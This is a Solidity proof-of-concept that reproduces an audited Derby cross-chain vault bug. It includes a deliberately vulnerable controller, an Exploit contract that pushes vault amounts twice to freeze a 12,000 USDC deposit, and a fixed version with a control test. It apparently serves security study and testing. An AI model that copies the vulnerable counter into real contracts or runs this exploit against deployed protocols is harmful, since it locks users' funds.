// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Derby — XChainController.pushVaultAmounts (Sherlock 2023-01-derby, H-12)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: pushVaultAmounts is permissionless and sendXChainAmount
    increments vaultStage.fundsReceived with no per-chain sent mark. A second
    push of a deposit chain makes fundsReceived = 4 while activeVaults = 3.
    sendFundsToVault (step 5) requires equality and reverts, so the 12,000 USDC
    deposit never leaves the controller.
    The increment is the audited line in sendXChainAmount
    (derby-yield-optimiser/contracts/XChainController.sol).
    Allocations 30/30/20 on 80,000 USDC produce a 12,000 USDC deposit on chain 2
    and an 8,000 USDC deposit on chain 3. Chain 1 withdraws 20,000 USDC and
    only counts fundsReceived when the vault answers. */

contract Token {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IXProvider {
    function pushSetXChainAllocation(
        address vault,
        uint32 chainId,
        uint256 amountToSend,
        uint256 exchangeRate,
        bool receivingFunds
    ) external payable;

    function xTransferToVaults(
        address vault,
        uint32 chain,
        uint256 amount,
        address underlying,
        uint256 slippage,
        uint256 relayerFee
    ) external payable;

    function getDecimals(address vault) external view returns (uint256);
}

contract XProvider is IXProvider {
    function pushSetXChainAllocation(address, uint32, uint256, uint256, bool) external payable {}

    function xTransferToVaults(address vault, uint32, uint256 amount, address underlying, uint256, uint256)
        external
        payable
    {
        Token(underlying).transferFrom(msg.sender, vault, amount);
    }

    function getDecimals(address) external pure returns (uint256) {
        return 6;
    }

    function reportFunds(XChainController controller, uint256 vaultNumber) external {
        controller.upFundsReceived(vaultNumber);
    }
}

contract XChainController {
    struct vaultInfo {
        int256 totalCurrentAllocation;
        uint256 totalUnderlying;
        uint256 totalSupply;
        uint256 totalWithdrawalRequests;
        mapping(uint32 => bool) chainIdOff;
        mapping(uint32 => int256) currentAllocationPerChain;
        mapping(uint32 => uint256) totalUnderlyingPerChain;
        mapping(uint32 => address) vaultChainAddress;
        mapping(uint32 => address) vaultUnderlyingAddress;
        mapping(uint32 => uint256) withdrawalRequests;
        mapping(uint32 => uint256) amountToDepositPerChain;
    }

    struct vaultStages {
        uint256 activeVaults;
        bool ready;
        bool allocationsReceived;
        uint256 underlyingReceived;
        uint256 fundsReceived;
        uint256 fundsSent;
    }

    address public dao;
    address public guardian;
    IXProvider public xProvider;
    uint32[] public chainIds;
    int256 public minimumAmount;
    mapping(uint256 => vaultInfo) internal vaults;
    mapping(uint256 => vaultStages) public vaultStage;

    modifier onlyDao() {
        require(msg.sender == dao, "dao");
        _;
    }

    modifier onlyGuardian() {
        require(msg.sender == guardian, "guardian");
        _;
    }

    modifier onlyXProvider() {
        require(msg.sender == address(xProvider), "xProvider");
        _;
    }

    modifier onlyWhenUnderlyingsReceived(uint256 vaultNumber) {
        require(vaultStage[vaultNumber].underlyingReceived == vaultStage[vaultNumber].activeVaults, "underlyings");
        _;
    }

    modifier onlyWhenFundsReceived(uint256 vaultNumber) {
        require(vaultStage[vaultNumber].fundsReceived == vaultStage[vaultNumber].activeVaults, "Not all funds received");
        _;
    }

    constructor(address _dao, address _guardian) {
        dao = _dao;
        guardian = _guardian;
        minimumAmount = 1000e6;
        vaultStage[1].ready = true;
    }

    function setHomeXProvider(address provider) external onlyDao {
        xProvider = IXProvider(provider);
    }

    function setChainIds(uint32[] calldata ids) external onlyGuardian {
        chainIds = ids;
    }

    function setVaultChainAddress(uint256 vaultNumber, uint32 chainId, address vault, address underlying)
        external
        onlyDao
    {
        vaults[vaultNumber].vaultChainAddress[chainId] = vault;
        vaults[vaultNumber].vaultUnderlyingAddress[chainId] = underlying;
    }

    function receiveAllocationsFromGameGuard(uint256 vaultNumber, int256[] calldata deltas) external onlyGuardian {
        uint256 active;
        for (uint256 i; i < chainIds.length; i++) {
            uint32 chain = chainIds[i];
            int256 delta = deltas[i];
            if (!(vaults[vaultNumber].currentAllocationPerChain[chain] == 0 && delta == 0)) {
                vaults[vaultNumber].chainIdOff[chain] = false;
                active += 1;
            }
            vaults[vaultNumber].totalCurrentAllocation += delta;
            vaults[vaultNumber].currentAllocationPerChain[chain] += delta;
            require(vaults[vaultNumber].totalCurrentAllocation >= 0, "allocation");
        }
        vaults[vaultNumber].totalUnderlying = 0;
        vaults[vaultNumber].totalSupply = 0;
        vaultStage[vaultNumber].underlyingReceived = 0;
        vaultStage[vaultNumber].activeVaults = active;
        vaultStage[vaultNumber].allocationsReceived = true;
        vaultStage[vaultNumber].ready = false;
    }

    function setTotalUnderlyingGuard(
        uint256 vaultNumber,
        uint32 chainId,
        uint256 underlying,
        uint256 supply,
        uint256 withdrawalRequests
    ) external onlyGuardian {
        vaults[vaultNumber].totalUnderlyingPerChain[chainId] = underlying;
        vaults[vaultNumber].withdrawalRequests[chainId] = withdrawalRequests;
        vaults[vaultNumber].totalSupply += supply;
        vaults[vaultNumber].totalUnderlying += underlying;
        vaults[vaultNumber].totalWithdrawalRequests += withdrawalRequests;
        vaultStage[vaultNumber].underlyingReceived++;
    }

    function upFundsReceived(uint256 vaultNumber) external onlyXProvider onlyWhenUnderlyingsReceived(vaultNumber) {
        vaultStage[vaultNumber].fundsReceived++;
    }

    function pushVaultAmounts(uint256 _vaultNumber, uint16 _chain)
        public
        payable
        virtual
        onlyWhenUnderlyingsReceived(_vaultNumber)
    {
        address vault = getVaultAddress(_vaultNumber, _chain);
        require(vault != address(0), "xChainController: not a valid vaultnumber");
        int256 totalAllocation = vaults[_vaultNumber].totalCurrentAllocation;
        uint256 totalWithdrawalRequests = vaults[_vaultNumber].totalWithdrawalRequests;
        uint256 totalUnderlying = vaults[_vaultNumber].totalUnderlying - totalWithdrawalRequests;
        uint256 totalSupply = vaults[_vaultNumber].totalSupply;
        uint256 decimals = xProvider.getDecimals(vault);
        uint256 newExchangeRate = (totalUnderlying * (10 ** decimals)) / totalSupply;

        if (!vaults[_vaultNumber].chainIdOff[uint32(_chain)]) {
            int256 amountToChain = calcAmountToChain(_vaultNumber, uint32(_chain), totalUnderlying, totalAllocation);
            (int256 amountToDeposit, uint256 amountToWithdraw) =
                calcDepositWithdraw(_vaultNumber, uint32(_chain), amountToChain);
            sendXChainAmount(_vaultNumber, uint32(_chain), amountToDeposit, amountToWithdraw, newExchangeRate);
        }
    }

    function calcDepositWithdraw(uint256 _vaultNumber, uint32 _chainId, int256 _amountToChain)
        internal
        view
        returns (int256, uint256)
    {
        uint256 currentUnderlying = vaults[_vaultNumber].totalUnderlyingPerChain[_chainId];
        int256 amountToDeposit = _amountToChain - int256(currentUnderlying);
        uint256 amountToWithdraw = amountToDeposit < 0 ? currentUnderlying - uint256(_amountToChain) : 0;
        return (amountToDeposit, amountToWithdraw);
    }

    function calcAmountToChain(uint256 _vaultNumber, uint32 _chainId, uint256 _totalUnderlying, int256 _totalAllocation)
        internal
        view
        returns (int256)
    {
        int256 allocation = vaults[_vaultNumber].currentAllocationPerChain[_chainId];
        int256 amountToChain = (int256(_totalUnderlying) * allocation) / _totalAllocation;
        amountToChain += int256(vaults[_vaultNumber].withdrawalRequests[_chainId]);
        return amountToChain;
    }

    function sendXChainAmount(
        uint256 _vaultNumber,
        uint32 _chainId,
        int256 _amountDeposit,
        uint256 _amountToWithdraw,
        uint256 _exchangeRate
    ) internal {
        address vault = getVaultAddress(_vaultNumber, _chainId);
        bool receivingFunds;
        uint256 amountToSend = 0;

        if (_amountDeposit > 0 && _amountDeposit < minimumAmount) {
            vaultStage[_vaultNumber].fundsReceived++;
        } else if (_amountDeposit >= minimumAmount) {
            receivingFunds = true;
            setAmountToDeposit(_vaultNumber, _chainId, _amountDeposit);
            // @> VULN: no per-chain sent mark, so a second push increments fundsReceived again
            vaultStage[_vaultNumber].fundsReceived++;
        }

        if (_amountToWithdraw > 0 && _amountToWithdraw < uint256(minimumAmount)) {
            vaultStage[_vaultNumber].fundsReceived++;
        } else if (_amountToWithdraw >= uint256(minimumAmount)) {
            amountToSend = _amountToWithdraw;
        }

        xProvider.pushSetXChainAllocation{value: msg.value}(vault, _chainId, amountToSend, _exchangeRate, receivingFunds);
    }

    function sendFundsToVault(uint256 _vaultNumber, uint256 _slippage, uint32 _chain, uint256 _relayerFee)
        external
        payable
        onlyWhenFundsReceived(_vaultNumber)
    {
        address vault = getVaultAddress(_vaultNumber, _chain);
        require(vault != address(0), "xChainController: not a valid vaultnumber");
        if (!vaults[_vaultNumber].chainIdOff[_chain]) {
            uint256 amountToDeposit = getAmountToDeposit(_vaultNumber, _chain);
            if (amountToDeposit > 0) {
                address underlying = getUnderlyingAddress(_vaultNumber, _chain);
                uint256 balance = Token(underlying).balanceOf(address(this));
                if (amountToDeposit > balance) amountToDeposit = balance;
                Token(underlying).approve(address(xProvider), amountToDeposit);
                xProvider.xTransferToVaults{value: msg.value}(
                    vault, _chain, amountToDeposit, underlying, _slippage, _relayerFee
                );
                setAmountToDeposit(_vaultNumber, _chain, 0);
            }
        }
        vaultStage[_vaultNumber].fundsSent++;
    }

    function getVaultAddress(uint256 vaultNumber, uint32 chainId) public view returns (address) {
        return vaults[vaultNumber].vaultChainAddress[chainId];
    }

    function getVaultAddress16(uint256 vaultNumber, uint16 chain) public view returns (address) {
        return getVaultAddress(vaultNumber, uint32(chain));
    }

    function getUnderlyingAddress(uint256 vaultNumber, uint32 chainId) public view returns (address) {
        return vaults[vaultNumber].vaultUnderlyingAddress[chainId];
    }

    function setAmountToDeposit(uint256 vaultNumber, uint32 chainId, int256 amount) internal {
        vaults[vaultNumber].amountToDepositPerChain[chainId] = uint256(amount);
    }

    function getAmountToDeposit(uint256 vaultNumber, uint32 chainId) public view returns (uint256) {
        return vaults[vaultNumber].amountToDepositPerChain[chainId];
    }

    function fundsReceived(uint256 vaultNumber) external view returns (uint256) {
        return vaultStage[vaultNumber].fundsReceived;
    }

    function activeVaults(uint256 vaultNumber) external view returns (uint256) {
        return vaultStage[vaultNumber].activeVaults;
    }
}

contract XChainControllerFixed is XChainController {
    mapping(uint256 => mapping(uint16 => bool)) public pushed;

    constructor(address dao_, address guardian_) XChainController(dao_, guardian_) {}

    function pushVaultAmounts(uint256 vaultNumber, uint16 chain) public payable override {
        require(!pushed[vaultNumber][chain], "already pushed");
        pushed[vaultNumber][chain] = true;
        super.pushVaultAmounts(vaultNumber, chain);
    }
}

abstract contract DerbyScenario {
    uint256 public constant DEPOSIT = 12_000e6;
    address public constant VAULT2 = 0x00000000000000000000000000000000000000b2;

    Token public token;
    XProvider public xprovider;
    XChainController public controller;

    function _wire(bool fixedController) internal {
        token = new Token();
        xprovider = new XProvider();
        if (fixedController) {
            controller = new XChainControllerFixed(address(this), address(this));
        } else {
            controller = new XChainController(address(this), address(this));
        }
        controller.setHomeXProvider(address(xprovider));
        uint32[] memory ids = new uint32[](3);
        ids[0] = 1;
        ids[1] = 2;
        ids[2] = 3;
        controller.setChainIds(ids);
        controller.setVaultChainAddress(1, 1, address(uint160(0xA11)), address(token));
        controller.setVaultChainAddress(1, 2, VAULT2, address(token));
        controller.setVaultChainAddress(1, 3, address(uint160(0xC33)), address(token));
        int256[] memory deltas = new int256[](3);
        deltas[0] = 30;
        deltas[1] = 30;
        deltas[2] = 20;
        controller.receiveAllocationsFromGameGuard(1, deltas);
        controller.setTotalUnderlyingGuard(1, 1, 50_000e6, 50_000e6, 0);
        controller.setTotalUnderlyingGuard(1, 2, 18_000e6, 18_000e6, 0);
        controller.setTotalUnderlyingGuard(1, 3, 12_000e6, 12_000e6, 0);
    }

    function _honestPushes() internal {
        controller.pushVaultAmounts(1, 1);
        controller.pushVaultAmounts(1, 2);
        controller.pushVaultAmounts(1, 3);
        xprovider.reportFunds(controller, 1);
    }
}

contract Exploit is DerbyScenario {
    constructor() {
        _wire(false);
    }

    function run() external {
        token.mint(address(controller), DEPOSIT);
        _honestPushes();
        require(controller.fundsReceived(1) == 3, "ready for step 5");
        require(controller.activeVaults(1) == 3, "three vaults");
        require(controller.getAmountToDeposit(1, 2) == DEPOSIT, "chain 2 deposit");
        controller.pushVaultAmounts(1, 2);
        require(controller.fundsReceived(1) == 4, "over-counted");
        (bool entered,) = address(controller).call(
            abi.encodeWithSignature("sendFundsToVault(uint256,uint256,uint32,uint256)", 1, 0, 2, 0)
        );
        require(!entered, "step 5 entered");
        uint256 stuck = token.balanceOf(address(controller));
        require(stuck == DEPOSIT, "12,000 USDC moved");
        require(token.balanceOf(VAULT2) == 0, "vault 2 received funds");
    }
}

contract ControlExploit is DerbyScenario {
    constructor() {
        _wire(true);
    }

    function run() external {
        token.mint(address(controller), DEPOSIT);
        _honestPushes();
        require(controller.fundsReceived(1) == 3, "ready");
        (bool again,) = address(controller).call(abi.encodeWithSignature("pushVaultAmounts(uint256,uint16)", 1, 2));
        require(!again, "second push counted");
        require(controller.fundsReceived(1) == 3, "still 3");
        controller.sendFundsToVault(1, 0, 2, 0);
        require(token.balanceOf(VAULT2) == DEPOSIT, "vault 2");
        require(token.balanceOf(address(controller)) == 0, "controller");
    }
}
